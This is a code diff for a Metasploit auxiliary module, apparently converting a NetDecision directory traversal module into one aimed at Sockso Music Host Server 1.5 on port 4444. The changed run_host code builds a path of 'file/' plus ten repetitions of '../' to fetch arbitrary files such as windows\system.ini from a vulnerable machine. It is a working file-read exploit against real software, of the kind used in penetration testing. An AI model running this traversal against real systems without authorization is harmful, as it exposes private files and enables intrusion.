@@ -15,16 +15,15 @@ class Metasploit3 < Msf::Auxiliary
 
 	def initialize(info = {})
 		super(update_info(info,
-			'Name'           => 'NetDecision NOCVision Server Directory Traversal',
+			'Name'           => 'Sockso Music Host Server 1.5 Directory Traversal',
 			'Description'    => %q{
-					This module exploits a directory traversal bug in NetDecision's
-				TrafficGrapherServer.exe service.  This is done by using "...\" in
-				the path to retrieve a file on a vulnerable machine.
+					This module exploits a directory traversal bug in Sockso on port
+				4444.  This is done by using "../" in the path to retrieve a file on
+				a vulnerable machine.
 			},
 			'References'     =>
 				[
-					[ 'OSVDB', '79863' ],
-					[ 'URL', 'http://aluigi.altervista.org/adv/netdecision_1-adv.txt' ],
+					[ 'URL', 'http://aluigi.altervista.org/adv/sockso_1-adv.txt' ],
 				],
 			'Author'         =>
 				[
@@ -32,14 +31,12 @@ class Metasploit3 < Msf::Auxiliary
 					'sinn3r'
 				],
 			'License'        => MSF_LICENSE,
-			'DisclosureDate' => "Mar 07 2012"
+			'DisclosureDate' => "Mar 14 2012",
 		))
 
 		register_options(
 			[
-				# 8087 = TrafficGrapherServer
-				# 8090 = NOCVisionServer
-				Opt::RPORT(8087),
+				Opt::RPORT(4444),
 				OptString.new('FILEPATH', [false, 'The name of the file to download', 'windows\\system.ini'])
 			], self.class)
 
@@ -47,10 +44,9 @@ class Metasploit3 < Msf::Auxiliary
 	end
 
 	def run_host(ip)
-		trav = "...\\...\\...\\...\\...\\...\\"
+		trav = "file/"
+		trav << "../" * 10
 
-		# In case the user doesn't realize he doesn't need to begin with "\",
-		# we'll correct that for him
 		file = datastore['FILEPATH']
 		file = file[1,file.length] if file[0,1] == "\\"
 
